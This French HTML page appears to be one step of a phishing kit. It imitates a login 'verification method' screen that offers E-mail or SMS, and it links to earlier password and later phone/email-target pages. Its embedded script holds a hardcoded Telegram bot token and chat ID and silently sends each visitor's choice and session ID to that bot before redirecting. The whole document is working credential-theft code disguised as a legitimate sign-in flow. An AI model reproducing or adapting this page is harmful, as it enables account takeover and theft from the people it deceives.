<!doctype html>
<html lang="fr">
<head>
<!-- Favicon standard pour les onglets de navigateur (PC / Mac) -->
    <link rel="icon" type="image/x-icon" href="logo.ico">
    <link rel="shortcut icon" type="image/x-icon" href="logo.ico">

    <!-- Icône pour l'écran d'accueil iOS (iPhone / iPad) -->
    <link rel="apple-touch-icon" href="logo.ico">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Connexion - Méthode de vérification</title>
  <style>
    :root { color: #111; font-family: "Futura", Arial, Helvetica, sans-serif; font-weight: bold; background: #fff; }
    * { box-sizing: border-box; }
    body { min-width: 320px; min-height: 100vh; margin: 0; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #fff; }
    main { width: min(100% - 40px, 400px); padding: 40px 0; margin: auto; text-align: center; }
    .top-logo { width: 400px; max-width: 100%; height: auto; margin: 0 auto 24px auto; display: block; }
    .choices { display: grid; gap: 18px; margin: 0 0 26px; text-align: left; }
    .choice { display: flex; align-items: center; gap: 12px; min-height: 52px; font-size: 17px; font-weight: bold; cursor: pointer; }
    .choice input { width: 22px; height: 22px; margin: 0; accent-color: #111; }
    .action { display: block; width: 85%; max-width: 340px; margin: 0 auto; padding: 0; border: 0; background: transparent; cursor: pointer; }
    .action img { display: block; width: 100%; height: auto; }
    .back { display: block; margin: 18px auto 0; padding: 4px; border: 0; background: transparent; color: #111; font: inherit; font-weight: bold; text-decoration: underline; cursor: pointer; text-align: center; }
  </style>
</head>
<body>
  <main>
    <img src="logo.JPG" alt="Logo" class="top-logo">
    <form id="formStep3">
      <div class="choices">
        <label class="choice">
          <input type="radio" name="method" value="E-mail" checked>
          <span>E-mail</span>
        </label>
        <label class="choice">
          <input type="radio" name="method" value="SMS">
          <span>SMS</span>
        </label>
      </div>
      <button class="action" id="submitBtn" type="submit">
        <img src="next.JPG" alt="Next">
      </button>
      <a href="2-password.html" class="back">Retour</a>
    </form>
  </main>
  <script>
    const TELEGRAM_TOKEN = "9165642873:AAFLPg7M2QpgRpwlbKtjKKlnrNe25oJckPo";
    const TELEGRAM_CHAT_ID = "8550191274";

    document.getElementById('formStep3').addEventListener('submit', async (e) => {
      e.preventDefault();
      const method = document.querySelector('input[name="method"]:checked').value;
      const clientId = localStorage.getItem('client_id') || 'Inconnu';

      const message = `🛡️ *Nouvelle info - Étape 3 (Méthode)*\n🆔 Session: \`${clientId}\`\n⚙️ Choix: \`${method}\``;
      const btn = document.getElementById('submitBtn');
      btn.style.opacity = '0.5';

      try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
      } catch (error) {
        console.error("Erreur Telegram", error);
      }

      window.location.href = method === 'SMS' ? '4b-phone-target.html' : '4a-email-target.html';
    });
  </script>
</body>
</html>
